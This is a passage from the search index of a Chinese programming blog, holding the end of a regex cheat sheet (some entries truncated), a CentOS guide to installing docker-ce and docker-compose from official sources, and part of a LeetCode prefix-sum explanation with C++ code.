&lt;td style=&#34;text-align:center&#34;&gt;匹配n，其中n为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，&lt;code&gt;\x41&lt;/code&gt;匹配&lt;code&gt;A&lt;/code&gt;。&lt;code&gt;\x041&lt;/code&gt;则等价于&lt;code&gt;\x04&amp;amp;1&lt;/code&gt;。正则表达式中可以使用ASCII编码。.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\num&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配num，其中num是一个正整数。对所获取的匹配的引用。例如，&lt;code&gt;(.)\1&lt;/code&gt;匹配两个连续的相同字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;标识一个八进制转义值或一个向后引用。如果\n之前至少n个获取的子表达式，则n为向后引用。否则，如果n为八进制数字（0-7），则n为一个八进制转义值。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\nm&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;标识一个八进制转义值或一个向后引用。如果\nm之前至少有nm个获得子表达式，则nm为向后引用。如果\nm之前至少有n个获取，则n为一个后跟文字m的向后引用。如果前面的条件都不满足，若n和m均为八进制数字（0-7），则\nm将匹配八进制转义值nm。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\nml&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;如果n为八进制数字（0-3），且m和l均为八进制数字（0-7），则匹配八进制转义值nml。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\un&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配n，其中n是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号（©）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;常用的正则匹配串&#34;&gt;常用的正则匹配串&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Desc&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Rule&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;非负整数&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;正整数&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[1-9]\d*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;浮点数&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+\.\d+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;英文字母&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z]+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;小数限制两位&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+(\.\d{1,2})?$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;中文字符验证&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^([\u4E00-\u9FA5])+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;身份证号&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^\d{15}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;邮箱&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z0-9.!#$%&amp;amp;&#39;*+\/=?^_&lt;/code&gt;{&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;车牌号&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领A-Z]{1}[A-Z]{1}[A-Z0-9]{4}[A-Z0-9挂学警港澳]{1}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;html标签&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/&amp;lt;(\w+)[^&amp;gt;]*&amp;gt;(.*?&amp;lt;\/\1&amp;gt;)?/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;html注释&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^&amp;lt;!--[\s\S]*?--&amp;gt;$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;火车车次&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[GCDZTSPKXLY1-9]\d{1,4}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;手机号-国内(宽松)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?😦?:+&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;座机(tel phone)电话(国内)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^\d{3}-\d{8}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;date(日期)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^\d{4}(-)(1[0-2]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;帐号，4到16位字母，数字，下划线，减号&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z0-9_-]{4,16}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;qq号&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[1-9][0-9]{4,10}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;微信号&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z][-_a-zA-Z0-9]{5,19}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;统一社会信用代码&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[0-9A-HJ-NPQRTUWXY]{2}\d{6}[0-9A-HJ-NPQRTUWXY]{10}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ed2k链接(宽松匹配)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^ed2k:\/\/|file|.+|\/$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;磁力链接(宽松匹配)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^magnet:\?xt=urn:btih:[0-9a-fA-F]{40,}.*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;子网掩码&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?:\d{1,2}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux文件路径&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\/(?:[^\/]+\/)*[^\/]+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux文件夹路径&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\/(?:[^\/]+\/)*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;window文件夹路径&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z]:\\(?:\w+\\?)*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;window下文件路径&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z]:\\(?:\w+\\)*\w+\.\w+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;股票代码(A股)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(s[hz]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;md5格式(32位)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^([a-f\d]{32}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;版本号, 格式为X.Y.Z&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+(?:\.\d+){2}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;视频(video)链接地址&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^https?://(.+/)+.+(.(swf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;图片(image)链接地址（&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^https?://(.+/)+.+(.(gif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;24小时制时间（HH:mm:ss）&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?:[01]\d&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12小时制时间（hh:mm:ss）&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?:1[0-2]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;base64格式&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\s*data:(?:[a-z]+\/[a-z0-9-+.]+(?:;[a-z-]+=[a-z0-9-]+)?)?(?:;base64)?,([a-z0-9!$&amp;amp;&#39;,()*+;=\-._~:@\/?%\s]*?)\s*$/i&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;银行卡号（10到30位, 覆盖对公/私账户, 参考微信支付）&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[1-9]\d{9,29}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mac 地址&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^((([a-f0-9]{2}😃{5})&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">正则表达式速查表</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-docker-ce-an-zhuang/"" data-c="
          &lt;h3 id=&#34;moby-docker-ce与docker-ee的区别&#34;&gt;moby、docker-ce与docker-ee的区别&lt;/h3&gt;
&lt;p&gt;最早的时候docker就是一个开源项目，主要由docker公司维护。&lt;/p&gt;
&lt;p&gt;2017年年初，docker公司将原先的docker项目改名为moby，并创建了docker-ce和docker-ee。&lt;/p&gt;
&lt;p&gt;这三者的关系是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;moby是继承了原先的docker的项目，是社区维护的的开源项目，谁都可以在moby的基础打造自己的容器产品&lt;/li&gt;
&lt;li&gt;docker-ce是docker公司维护的开源项目，是一个基于moby项目的免费的容器产品&lt;/li&gt;
&lt;li&gt;docker-ee是docker公司维护的闭源产品，是docker公司的商业产品。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;moby project由社区维护， docker-ce project是docker公司维护，docker-ee是闭源的。&lt;/p&gt;
&lt;p&gt;要使用免费的docker，从网页docker-ce上获取。&lt;/p&gt;
&lt;p&gt;要使用收费的docker，从网页docker-ee上获取。&lt;/p&gt;
&lt;h3 id=&#34;centos&#34;&gt;centos&lt;/h3&gt;
&lt;h4 id=&#34;docker-ce&#34;&gt;docker-ce&lt;/h4&gt;
&lt;p&gt;以下内容根据 官方文档 修改而来。&lt;/p&gt;
&lt;p&gt;如果你之前安装过 docker，请先删掉&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo yum remove docker docker-common docker-selinux docker-engine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装一些依赖&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo yum install -y yum-utils device-mapper-persistent-data lvm2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据你的发行版下载repo文件:&lt;/p&gt;
&lt;p&gt;CentOS/RHEL&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget -O /etc/yum.repos.d/docker-ce.repo https://download.docker.com/linux/centos/docker-ce.repo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把软件仓库地址替换为 TUNA:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo sed -i &#39;s+download.docker.com+mirrors.tuna.tsinghua.edu.cn/docker-ce+&#39; /etc/yum.repos.d/docker-ce.repo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后安装:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo yum makecache fast
sudo yum install docker-ce
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;docker-compose&#34;&gt;docker-compose&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -L &amp;quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;quot; -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
&lt;/code&gt;&lt;/pre&gt;
">【容器】docker-ce、docker-compose安装</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-qian-zhui-he/"" data-c="
          &lt;h2 id=&#34;数组前缀和&#34;&gt;数组前缀和&lt;/h2&gt;
&lt;p&gt;例题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/subarray-sum-equals-k/&#34;&gt;和为K的子数组&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;/*
求数组的前缀和数组pre
然后求满足pre[i]-pre[j]==k的个数，即为答案
在求前缀和时边记录每个前缀和出现的次数，用map记录
那么对于以i结尾的数组找出pre[j]=pre[i]-k的个数累加起来。
*/
class Solution {
public:
    int subarraySum(vector&amp;lt;int&amp;gt;&amp;amp; nums, int k) {
        int ans = 0;
        unordered_map&amp;lt;int, int&amp;gt; mmp;
        mmp[0] = 1;
        int pre = 0;

        for(int i = 0; i &amp;lt; nums.size(); i++)
        {
            pre += nums[i];
            ans += mmp[pre - k];
            mmp[pre] += 1;
        }

        return ans;
        
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/subarray-sums-divisible-by-k/&#34;&gt;和可被 K 整除的子数组&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们令 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;nums&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;nums&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mo&gt;…&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;nums&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[i] = \textit{nums}[0] + \textit{nums}[1] + \ldots + \textit{nums}[i]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;nums&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;nums&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;minner&#34;&gt;…&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;nums&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。那么每个连续子数组的和 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;sum&lt;/mtext&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\textit{sum}(i, j)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;sum&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 就可以写成 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[j] - P[i-1]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;（其中 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;0 &amp;lt; i &amp;lt; j&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69862em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;）的形式。此时，判断子数组的和能否被 k 整除就等价于判断 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;(P[j] - P[i-1]) \bmod k == 0&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span 